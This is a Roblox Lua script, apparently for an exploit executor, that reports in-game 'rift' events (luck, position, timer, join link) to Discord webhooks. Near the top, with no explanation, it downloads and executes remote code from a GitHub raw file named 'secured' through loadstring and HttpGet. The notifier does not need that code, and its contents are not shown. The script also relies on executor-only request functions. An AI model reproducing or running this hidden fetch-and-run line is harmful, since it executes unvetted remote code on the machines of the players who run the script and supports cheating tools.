task.wait(4)
local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")

local player  = Players.LocalPlayer
local placeId = game.PlaceId
local jobId   = game.JobId or ""

-- Rifts folder
local RIFTS_FOLDER = workspace:WaitForChild("Rendered"):WaitForChild("Rifts")


loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/BGSI/refs/heads/main/secured"))()


-- Determine HTTP request function
local requestFn = http_request or request or (syn and syn.request)
if not requestFn then
    warn("HTTP request function unavailable; webhooks will not be sent")
end

-- Helper: extract luck, height, and time left
local function getRiftInfo(r)
    local luckVal, yPos, timeLeft = nil, "unknown", "unknown"
    local part = r.PrimaryPart or r:FindFirstChildWhichIsA("BasePart")
    if part then yPos = tostring(math.floor(part.Position.Y)) end

    local display = r:FindFirstChild("Display")
    if display then
        local gui = display:FindFirstChild("SurfaceGui")
        if gui then
            local icon = gui:FindFirstChild("Icon")
            if icon then
                local luck = icon:FindFirstChild("Luck")
                if luck and luck:IsA("TextLabel") then luckVal = luck.Text end
            end
            local timer = gui:FindFirstChild("Timer")
            if timer and timer:IsA("TextLabel") then timeLeft = timer.Text end
        end
    end
    return luckVal, yPos, timeLeft
end

-- Async send webhook payload using proper `fields` (avoid obfuscation issues)
-- Note: dynamic keys or string.char tricks can cause HttpService:JSONEncode to omit or reorder fields,
-- leading Discord to ignore the embed. Using literal `fields` ensures correct payload structure.
local function sendWebhookAsync(url, r)
    task.spawn(function()
        if not requestFn then return end
        local luckVal, yPos, timeLeft = getRiftInfo(r)
        local playerCount = #Players:GetPlayers()
        local launchData = placeId .. "/" .. jobId
        local joinLink = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&launchData=" .. launchData

        -- Build embed table with literal `fields`
        local embed = {
            title = r.Name,
            color = 9164313,
            fields = {
                { name = "🥚 Egg Luck",    value = luckVal or "nil",                     inline = true },
                { name = "📍 Location",    value = yPos,                           inline = true },
                { name = "⏳ Time Left",    value = timeLeft,                       inline = true },
                { name = "👥 Players",     value = tostring(playerCount) .. "/12", inline = true },
                { name = "🔗 Join Server", value = "[Click here](" .. joinLink .. ")",    inline = false }
            }
        }

        -- Encode the full payload
        local payload = HttpService:JSONEncode({ content = nil, embeds = { embed }, attachments = {} })
        local headers = { ["content-type"] = "application/json" }
        local ok, res = pcall(function()
            return requestFn({ Url = url, Method = "POST", Headers = headers, Body = payload })
        end)
        if not ok then warn("Failed to send webhook to " .. url .. ": " .. tostring(res)) end
    end)
end

-- Prevent duplicate runs
if player:GetAttribute("HasScriptRun") then return end
player:SetAttribute("HasScriptRun", true)

-- Process and send webhooks
task.spawn(function()
    for _, r in ipairs(RIFTS_FOLDER:GetChildren()) do
        for _, hook in ipairs(Config.webhooks) do
            if hook.enabled and (hook.name == "All Rifts" or r.Name == hook.name) then
                local luckVal = select(1, getRiftInfo(r))
                local shouldSend = true
                if hook.lucks and #hook.lucks > 0 then
                    shouldSend = false
                    if luckVal then
                        for _, allowed in ipairs(hook.lucks) do
                            if luckVal == allowed then shouldSend = true break end
                        end
                    end
                end
                if shouldSend then sendWebhookAsync(hook.url, r) end
            end
        end
    end
end)



